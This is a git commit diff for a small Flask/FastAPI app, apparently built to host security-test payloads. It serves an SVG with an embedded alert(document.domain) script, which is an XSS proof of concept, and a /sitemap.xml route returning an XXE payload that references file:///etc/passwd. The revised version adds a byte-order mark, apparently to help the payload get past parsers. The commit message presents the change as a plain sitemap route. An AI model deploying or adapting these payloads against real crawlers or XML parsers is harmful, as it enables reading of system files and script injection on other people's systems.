f384c3ccc5fad63c41abf3fd27c020247423aab6
w41bu1 <buivanyk4@gmail.com>
2025-09-29 01:17:47 +0700

    Add /sitemap.xml route

--- api/index.py
+++ api/index.py
@@ -1,32 +1,37 @@
-from flask import Flask, Response
-import os
+from flask import Flask, Response as FlaskResponse
+from fastapi import FastAPI
+from starlette.middleware.wsgi import WSGIMiddleware
+from fastapi.responses import Response as FastResponse
 
-app = Flask(__name__)
+flask_app = Flask(__name__)
 
-@app.route('/')
+@flask_app.route("/")
 def home():
-    return 'Hello, World!'
+    return "Hello, World!"
 
-@app.route('/svg')
-def about():
-    svg = """<?xml version="1.0" encoding="UTF-8"?>
-    <svg xmlns="http://www.w3.org/2000/svg">
-        <script>alert(document.domain)</script>
-    </svg>"""
-    return Response(svg, mimetype="image/svg+xml")
+@flask_app.route("/svg")
+def svg():
+    svg_content = '<?xml version="1.0" encoding="UTF-8"?>\n<svg xmlns="http://www.w3.org/2000/svg"><script>alert(document.domain)</script></svg>'
+    return FlaskResponse(svg_content, mimetype="image/svg+xml")
 
-@app.route("/sitemap.xml")
+app = FastAPI()
+app.mount("/", WSGIMiddleware(flask_app))
+
+@app.get("/sitemap.xml")
 def sitemap():
-    xml_content = """<?xml version="1.0" encoding="UTF-8"?>
-<!DOCTYPE urlset [
-    <!ENTITY xxe SYSTEM "file:///etc/passwd">
-]>
-<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">
-  <url>
-    <loc>https://example.com/?abc=&xxe;</loc>
-    <lastmod>2025-07-30</lastmod>
-    <changefreq>daily</changefreq>
-    <priority>1.0</priority>
-  </url>
-</urlset>"""
-    return Response(xml_content, mimetype="application/xml")
+    xml_bytes = (
+        b'\xEF\xBB\xBF'
+        b'<?xml version="1.0" encoding="UTF-8"?>\n'
+        b'<!DOCTYPE urlset [\n'
+        b'    <!ENTITY xxe SYSTEM "file:///etc/passwd">\n'
+        b']>\n'
+        b'<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">\n'
+        b'  <url>\n'
+        b'    <loc>https://example.com/?abc=&xxe;</loc>\n'
+        b'    <lastmod>2025-07-30</lastmod>\n'
+        b'    <changefreq>daily</changefreq>\n'
+        b'    <priority>1.0</priority>\n'
+        b'  </url>\n'
+        b'</urlset>'
+    )
+    return FastResponse(content=xml_bytes, media_type="application/xml")
